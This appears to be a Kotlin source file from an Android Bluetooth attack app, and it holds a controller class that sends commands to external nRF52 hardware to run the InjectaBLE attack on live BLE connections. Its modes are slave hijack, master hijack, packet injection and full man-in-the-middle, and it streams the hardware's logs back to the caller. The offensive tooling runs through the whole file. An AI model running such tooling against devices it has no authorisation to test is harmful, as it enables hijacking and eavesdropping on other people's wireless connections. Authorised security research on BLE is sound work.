package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach

/**
 * Enum representing the injection modes available for the InjectaBLE attack.
 *
 * Each mode targets a different aspect of an active BLE connection at the Link Layer.
 */
enum class InjectionMode {
    /** Inject packets as the slave role to hijack the slave position. */
    SLAVE_HIJACK,
    /** Inject packets as the master role to hijack the master position. */
    MASTER_HIJACK,
    /** Inject arbitrary packets into the connection without role takeover. */
    PACKET_INJECT,
    /** Combine slave and master hijacking to achieve full Man-in-the-Middle. */
    FULL_MITM
}

/**
 * Module responsible for the InjectaBLE attack.
 *
 * InjectaBLE exploits a BLE specification vulnerability at the Link Layer to inject
 * malicious packets into an already-established BLE connection without disrupting it.
 * Unlike BtleJacking, this does not require jamming or disconnecting the original
 * participants. It requires specialized nRF52-based hardware (e.g., ButteRFly dongle)
 * because standard Bluetooth chips cannot perform precise packet injection at the
 * Link Layer timing required.
 *
 * This class acts as the controller for that external hardware, sending commands
 * via the [HardwareManager] and streaming real output back to the caller.
 *
 * @property hardwareManager Interface to the external radio hardware.
 */
class InjectableModule(private val hardwareManager: HardwareManager) {

    companion object {
        private const val TAG = "InjectableModule"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var injectionJob: Job? = null

    /**
     * Starts the InjectaBLE attack against a target device in the specified mode.
     *
     * Sends the injection command to the nRF52 hardware and streams back log
     * output from the device as a [Flow] of strings.
     *
     * @param targetDevice The BLE device whose active connection to inject into.
     * @param mode The [InjectionMode] determining the injection strategy.
     * @return A [Flow] emitting log lines from the hardware as the attack progresses.
     * @throws IllegalArgumentException if the target MAC address is invalid.
     */
    fun startInjection(targetDevice: TargetDevice, mode: InjectionMode): Flow<String> {
        // Validate MAC before interpolating into serial command
        MacValidator.requireValid(targetDevice.macAddress)

        return callbackFlow {
            // Cancel any existing injection before launching a new one
            injectionJob?.cancel()

            val modeArg = when (mode) {
                InjectionMode.SLAVE_HIJACK -> "slave_hijack"
                InjectionMode.MASTER_HIJACK -> "master_hijack"
                InjectionMode.PACKET_INJECT -> "packet_inject"
                InjectionMode.FULL_MITM -> "full_mitm"
            }

            trySend("[*] Starting InjectaBLE in ${mode.name} mode...")
            trySend("[*] Target: ${targetDevice.macAddress}")

            // Send the injection command to the nRF52 hardware
            hardwareManager.sendCommand("injectable -t ${targetDevice.macAddress} -m $modeArg")

            // Collect hardware log output and forward to the caller
            injectionJob = hardwareManager.deviceLogs
                .onEach { logLine ->
                    trySend(logLine)
                }
                .launchIn(scope)

            awaitClose {
                injectionJob?.cancel()
                injectionJob = null
            }
        }
    }

    /**
     * Checks whether the external nRF52 hardware is currently connected and ready.
     *
     * @return true if hardware is in a connected state.
     */
    fun isHardwareConnected(): Boolean {
        val state = hardwareManager.hardwareState.value
        return state == HardwareState.CONNECTED_BTLEJACK || state == HardwareState.CONNECTED_DUAL
    }

    /**
     * Stops any active injection and sends a stop command to the hardware.
     */
    fun stopInjection() {
        injectionJob?.cancel()
        injectionJob = null
        hardwareManager.sendCommand("stop")
        Log.d(TAG, "Injection stopped.")
    }

    /**
     * Releases all resources: cancels any running injection, stops hardware,
     * and cancels the coroutine scope.
     */
    fun close() {
        stopInjection()
        scope.cancel()
    }
}
